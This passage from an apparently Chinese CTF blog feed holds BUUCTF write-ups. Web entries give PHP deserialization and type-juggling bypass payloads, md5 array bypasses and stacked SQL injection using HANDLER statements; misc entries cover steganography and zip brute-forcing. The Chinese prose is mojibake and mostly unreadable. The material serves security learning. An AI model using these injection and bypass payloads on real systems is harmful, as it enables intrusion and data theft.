punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é¦–å…ˆåœ¨åˆšæ‰å°±è¢«æˆ‘ä»¬å¦å®šçš„write()å‡½æ•°ï¼Œæ˜¯ç»å¯¹ä¸èƒ½ç”¨çš„ï¼Œæ‰€ä»¥opç»å¯¹ä¸å¯ä»¥=1ï¼Œæ‰€ä»¥æƒ³è¦ä¿ä½op=2çš„å‰æä¸‹åˆç»•è¿‡__destruct()å‡½æ•°ï¼Œå°±è¦ä½¿ç”¨å¼±ç±»å‹æ¥å®ç°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š</p><p>if($this-&gt;op == â€œ2â€) è¿™é‡Œçš„2å¯æ˜¯æ•´æ•°å‹ï¼Œå¯ä»¥æ˜¯å­—ç¬¦å‹ï¼Œéƒ½è¿”å›true</p><p>if($this-&gt;op === â€œ2â€) è¿™é‡Œçš„2å¦‚æœæ˜¯æ•´æ•°å‹åˆ™è¿”å›falseï¼Œåªæœ‰å­—ç¬¦å‹çš„æ—¶å€™æ‰è¿”å›true</p><p>è¿™æ ·å°±å¯ä»¥ç»™$opä¼ å…¥æ•´æ•°å‹2çš„å€¼æ¥å®ç°å³ç»•è¿‡äº†__destruct()å‡½æ•°ï¼Œåˆèƒ½ä¿è¯æ‰§è¡Œread()æ–¹æ³•</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€åä¸€ä¸ªè€ƒç‚¹å°±æ˜¯åœ¨é‡åˆ°è¿™ä¸ªfile_get_contents()å‡½æ•°çš„æ—¶å€™ï¼Œç»“åˆphp://filter/read=convert.base64-encode/resource=flag.php,ç­‰å„ç§ä¼ªåè®®ç»•è¿‡å§¿åŠ¿(æˆ‘æ²¡æœ‰è¯•)</p><p>ç„¶åå¯ä»¥æœ¬åœ°ç¯å¢ƒæ¥å®éªŒäº†ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">FileHandler</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$op</span> <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileHandler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ„é€ payloadï¼š</p><pre><code>?str=O:11:&quot;FileHandler&quot;:3:{s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;}</code></pre><p>å³é”®æŸ¥çœ‹æºä»£ç å¾—åˆ°flag</p><h1 id="2021-4-27"><a href="#2021-4-27" class="headerlink" title="2021-4-27"></a>2021-4-27</h1><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><p>é¢˜ç›®æºä»£ç </p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">'flag.php'</span><span class="token punctuation">;</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token string">'MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}'</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'gg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$gg</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'gg'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$gg</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$id</span> <span class="token operator">!==</span> <span class="token variable">$gg</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'You got the first step'</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$passwd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token operator">==</span><span class="token number">1234567</span><span class="token punctuation">)</span>                 <span class="token punctuation">{</span>                     <span class="token keyword">echo</span> <span class="token string">'Good Job!'</span><span class="token punctuation">;</span>                     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'By Retr_0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token punctuation">}</span>                 <span class="token keyword">else</span>                 <span class="token punctuation">{</span>                     <span class="token keyword">echo</span> <span class="token string">"can you think twice??"</span><span class="token punctuation">;</span>                 <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">'You can not get it !'</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'only one way to get the flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span>    <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"You are not a real hacker!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Please input first'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç¬¬ä¸€æ­¥ç»•è¿‡ï¼š</p><pre><code> if (md5($id) === md5($gg) &amp;&amp; $id !== $gg) </code></pre><p>åˆ©ç”¨æ•°ç»„ç»•è¿‡ï¼š</p><pre><code>?gg[]=1&amp;id[]=2</code></pre><p>ç¬¬äºŒæ­¥ç»•è¿‡ï¼š</p><pre><code>if (!is_numeric($passwd))            {                 if($passwd==1234567)</code></pre><p>payloadï¼š</p><pre><code>passwd=1234567e</code></pre><p>ç„¶åå¾—åˆ°flag</p><p>å¤§ä½¬çš„åšå®¢ï¼š<a href="https://www.ghtwf01.cn/index.php/archives/777/" target="_blank" rel="noopener">PHPå¼±ç±»å‹åŠç›¸å…³å‡½æ•°Bypass</a></p><h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>æ³¨å…¥é¢˜ç›®ï¼Œå…ˆsqlfuzzä¸€ä¸‹ï¼Œçœ‹å“åº”é‡Œé¢æœ‰æç¤ºï¼š</p><p>preg_match(â€œ/set|prepare|alter|rename|select|update|delete|drop|insert|where|./iâ€,$inject);</p><p>å¦å¤–è¿™ä¸ªç½‘ç«™æœ‰é˜²sqlmapå°±åˆ«æƒ³sqlmapäº†ï¼</p><p>å †å æ³¨å…¥äº†ï¼Œè·Ÿå¼ºç½‘æ¯çš„éšä¾¿æ³¨ä¸€ä¸ªæ¨¡æ¿ï¼ŒåŒæ—¶ä¹Ÿè¿‡æ»¤äº†å¾ˆå¤š</p><p>payloadï¼š</p><pre><code>1&#39;;show tables;#</code></pre><p>å¾—åˆ°è¡¨æ˜ï¼šFlagHere</p><pre><code>1&#39;;show columns from FlagHere;#</code></pre><p>å¾—åˆ°åˆ—åï¼šflag</p><p>åˆ©ç”¨æŠ¥é”™æ³¨å…¥å¾—åˆ°åº“åï¼šsupersqli</p><pre><code>-1&#39; or extractvalue(1,concat(&#39;~&#39;,database()))#</code></pre><p>æ–°è€ƒç‚¹å­¦ä¹ ï¼š<a href="https://blog.csdn.net/JesseYoung/article/details/40785137" target="_blank" rel="noopener">mysqlä¸­çš„HANDLER â€¦ OPENè¯­å¥</a></p><p>payloadï¼š</p><pre><code>1&#39;;use supersqli;handler FlagHere open;handler FlagHere read first;handler FlagHere close;</code></pre><p>å¾—åˆ°flag</p><h1 id="2021-04-29"><a href="#2021-04-29" class="headerlink" title="2021-04-29"></a>2021-04-29</h1><p>è“å¸½æ¯ï¼šå…¨å›½æ’å123ï¼ˆæ¨¡ç³Šï¼‰åŒ—éƒ¨æˆ˜åŒº66åï¼Œå±±ä¸œ20</p><p>è§£å‡ºé¢˜ç›®ï¼šmisc1+web1</p><h1 id="2021-04-30"><a href="#2021-04-30" class="headerlink" title="2021-04-30"></a>2021-04-30</h1><p>è¿›å…¥æ˜Ÿç›Ÿå®‰å…¨çš„å¤©æ±‰å®‰å…¨å›¢é˜Ÿï¼Œå› ä¸ºè¦é€šè¿‡æˆ˜é˜Ÿè€ƒæ ¸æœŸæ•…è€Œè½¬æˆ˜CTFHUB</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> buuctf </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctfä¹‹Misc</title>
      <link href="/2021/01/15/buuctf-zhi-misc/"/>
      <url>/2021/01/15/buuctf-zhi-misc/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=33035611&auto=1&height=66"></iframe><h1 id="2021-1-15"><a href="#2021-1-15" class="headerlink" title="2021/1/15"></a>2021/1/15</h1><h2 id="äºŒç»´ç "><a href="#äºŒç»´ç " class="headerlink" title="äºŒç»´ç "></a>äºŒç»´ç </h2><p>ä¸‹è½½å¾—åˆ°QR_code.pngå›¾ç‰‡ï¼Œæ‰«ç å¾—åˆ°secret is hereï¼Œä½†å¹¶éflagã€‚</p><p>ä½†æ˜¯è¿™ä¸ªå›¾ç‰‡çš„å¤§å°å´æ˜¯600å¤šä¸ªkbï¼Œæ‰€ä»¥æ€€ç–‘æ˜¯å‹ç¼©åŒ…æ–‡ä»¶ï¼Œæ”¹ä¸ªåç¼€zipæ‰“å¼€å‘ç°æœ‰å¯†ç </p><p>å› ä¸ºæ–‡ä»¶åå­—æ˜¯4numberæ‰€ä»¥çˆ†ç ´å¾—åˆ°å¯†ç 7639ï¼Œè§£å‹å¾—åˆ°flagï¼šCTF{vjpw_wnoei}</p><p>æ”¹ä¸ºflag{vjpw_wnoei}æäº¤æˆåŠŸ</p><h2 id="Nç§æ–¹æ³•è§£å†³"><a href="#Nç§æ–¹æ³•è§£å†³" class="headerlink" title="Nç§æ–¹æ³•è§£å†³"></a>Nç§æ–¹æ³•è§£å†³</h2><p>ä¹Ÿæ˜¯ä¸€ä¸ªæ”¹åç¼€çš„é¢˜ï¼Œæ”¹ä¸ºtxtå¾—åˆ°</p><pre><code>data:image/jpg;base64,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</code></pre><p>è¦æ˜¯æˆ‘è®°å¾—æ²¡é”™åº”è¯¥æ˜¯base64å’Œå›¾ç‰‡çš„è½¬æ¢ï¼Œå¾—åˆ°äºŒç»´ç ä¸€å¼ æ‰«ä¸€ä¸‹å¾—ï¼šKEY{dca57f966e4e4e31fd5b15417da63269}</p><p>flag{dca57f966e4e4e31fd5b15417da63269}</p><h2 id="å¤§ç™½"><a href="#å¤§ç™½" class="headerlink" title="å¤§ç™½"></a>å¤§ç™½</h2><p>æç¤ºï¼šçœ‹ä¸åˆ°å›¾ï¼Ÿ æ˜¯ä¸æ˜¯å±å¹•å¤ªå°äº† </p><p>æ„æ€å°±æ˜¯è¯´è¿™ä¸ªå›¾ä¸‹é¢è¿˜æœ‰ä¸€åŠæ²¡æ˜¾ç¤ºå‡ºæ¥</p><p>ç”¨winhexæ‰“å¼€</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8815%E6%97%A51825_1.png" alt></p><p>å°†67æ”¹ä¸ºä¸23ç›¸åŒçš„02å’ŒA7ï¼ˆä¿®æ”¹é«˜åº¦å’Œå®½åº¦ç›¸åŒï¼‰ç„¶åå¾—åˆ°flag{He1l0_d4_ba1}</p><h2 id="ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°"><a href="#ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°" class="headerlink" title="ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°"></a>ä½ ç«Ÿç„¶èµ¶æˆ‘èµ°</h2><p>tmdï¼Œåˆæ˜¯ä¸€é“å›¾ç‰‡éšå†™é¢˜</p><p>winhexæ‰“å¼€çœ‹çœ‹ï¼Œç›´æ¥Ctrl+få°±æ‰¾åˆ°äº†</p><p>flag{stego_is_s0_bor1ing}</p><h1 id="2021-1-16"><a href="#2021-1-16" class="headerlink" title="2021/1/16"></a>2021/1/16</h1><h2 id="åŸºç¡€ç ´è§£"><a href="#åŸºç¡€ç ´è§£" class="headerlink" title="åŸºç¡€ç ´è§£"></a>åŸºç¡€ç ´è§£</h2><p>æç¤ºï¼šç»™ä½ ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œä½ å¹¶ä¸èƒ½è·å¾—ä»€ä¹ˆï¼Œå› ä¸ºä»–æ˜¯å››ä½æ•°å­—åŠ å¯†çš„å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆå“ˆã€‚ã€‚ã€‚ä¸å¯¹= =æˆ‘è¯´äº†ä»€ä¹ˆäº†ä¸å¾—çš„ä¸œè¥¿ã€‚ã€‚ </p><p>ä¸€çœ‹æ˜¯å››ä½æ•°çš„å¯†ç ï¼ŒARARç›´æ¥çˆ†ç ´</p><h2 id="ä¹Œé•‡å³°ä¼šç§å›¾"><a href="#ä¹Œé•‡å³°ä¼šç§å›¾" class="headerlink" title="ä¹Œé•‡å³°ä¼šç§å›¾"></a>ä¹Œé•‡å³°ä¼šç§å›¾</h2><p>è¿™ä¸ªé¢˜è¯´æ¥ä¹Ÿå·§ï¼Œæˆ‘åˆšåœ¨uç›˜é‡Œé¢å‘ç°ä¸€ä¸ªæ²¡ç”¨çš„å›¾ç‰‡å¹¶ä¸”æŠŠå®ƒåˆ äº†ï¼Œç»“æœä¸‹ä¸€é¢˜ï¼ˆè¿™ä¸ªé¢˜ï¼‰å°±æ˜¯æˆ‘åˆ æ‰çš„å›¾ç‰‡</p><p>winhexç›´æ¥è¿‡</p><h2 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h2><h3 id="å…³äºstegsolveçš„ä½¿ç”¨ï¼š"><a href="#å…³äºstegsolveçš„ä½¿ç”¨ï¼š" class="headerlink" title="å…³äºstegsolveçš„ä½¿ç”¨ï¼š"></a>å…³äºstegsolveçš„ä½¿ç”¨ï¼š</h3><p>File Format:æ–‡ä»¶æ ¼å¼ï¼Œè¿™é‡Œå¯ä»¥çœ‹è§å›¾ç‰‡çš„å…·ä½“ä¿¡æ¯æœ‰æ—¶å€™æœ‰äº›å›¾ç‰‡éšå†™çš„flagä¼šè—åœ¨è¿™é‡Œ</p><p>Data Extract:æ•°æ®æå–ï¼Œç”¨äºæå–RGBæ•°æ®ä¿¡æ¯</p><p>Steregram Solve:ç«‹ä½“è¯•å›¾ å¯ä»¥å·¦å³æ§åˆ¶åç§»</p><p>Frame Browser:å¸§æµè§ˆå™¨ï¼Œä¸»è¦æ˜¯å¯¹GIFä¹‹ç±»çš„åŠ¨å›¾è¿›è¡Œåˆ†è§£ï¼ŒæŠŠåŠ¨å›¾ä¸€å¸§å¸§çš„æ”¾</p><p>Image Combiner:æ‹¼å›¾ï¼Œå›¾ç‰‡æ‹¼æ¥</p><h4 id="å…³äºç‰ˆå—Data-Extract"><a href="#å…³äºç‰ˆå—Data-Extract" class="headerlink" title="å…³äºç‰ˆå—Data Extract"></a>å…³äºç‰ˆå—Data Extract</h4><p>Data Extract:(å¥½å¤šæ¶‰åŠåˆ°æ•°æ®æå–çš„æ—¶å€™ï¼Œå¾ˆå¤šåšä¸»åœ¨wpä¸­éƒ½æ˜¯ä¸€å¸¦è€Œè¿‡ï¼Œå°ç™½ä»¬è¿˜ä»¥ä¸ºè¦ä¸€ä¸ªä¸ªè¯•ã€‚ã€‚)</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8817%E6%97%A51639_1.png" alt></p><p> å·¦è¾¹ä¸€å¤§éƒ¨åˆ†ä¸»è¦æ˜¯è®²äº†RGBAï¼ˆAlphaæ˜¯é€æ˜åº¦ï¼‰çš„é¢œè‰²é€šé“</p><p>ä¸ºäº†æ–¹ä¾¿ç†è§£æˆ‘ä»¬åˆ†å¼€è¯´</p><p>RGBæ˜¯çº¢ç»¿è“ ä½†ä»–ä»¬çš„å€¼ä»£è¡¨çš„å®é™…ä¸Šæ˜¯äº®åº¦</p><p>Rçš„æ•°å­—è¶Šå¤§ï¼Œåˆ™ä»£è¡¨çº¢è‰²äº®åº¦è¶Šé«˜ï¼›Rçš„æ•°å­—è¶Šå°ï¼Œåˆ™ä»£è¡¨çº¢è‰²äº®åº¦è¶Šä½ã€‚Gï¼ŒBåŒç†</p><p>Rçš„äº®åº¦å„æœ‰256ä¸ªçº§åˆ«ï¼ŒGBåŒç†ã€‚å³ä»0åˆ°255ï¼Œåˆè®¡ä¸º256ä¸ªã€‚ä»æ•°å­—0åˆ°255çš„é€æ¸å¢é«˜ï¼Œæˆ‘ä»¬äººçœ¼è§‚å¯Ÿåˆ°çš„å°±æ˜¯äº®åº¦è¶Šæ¥è¶Šå¤§ï¼Œçº¢è‰²ã€ç»¿è‰²æˆ–è“è‰²è¶Šæ¥è¶Šäº®ã€‚ç„¶è€Œ256æ˜¯2çš„8æ¬¡æ–¹ æ‰€ä»¥ä½ ä¼šçœ‹è§ä¸Šå›¾çš„7~0 ä¸€å…±8ä¸ªé€šé“</p><p>è€ŒAlphaå°±æ˜¯é€æ˜åº¦ è¯¥é€šé“ç”¨256çº§ç°åº¦æ¥è®°å½•å›¾åƒä¸­çš„é€æ˜åº¦ä¿¡æ¯ï¼Œå®šä¹‰é€æ˜ã€ä¸é€æ˜å’ŒåŠé€æ˜åŒºåŸŸ</p><p>alphaçš„å€¼ä¸º0å°±æ˜¯å…¨é€æ˜ï¼Œalpha çš„å€¼ä¸º 255 åˆ™è¡¨ç¤ºä¸é€æ˜</p><p>å› 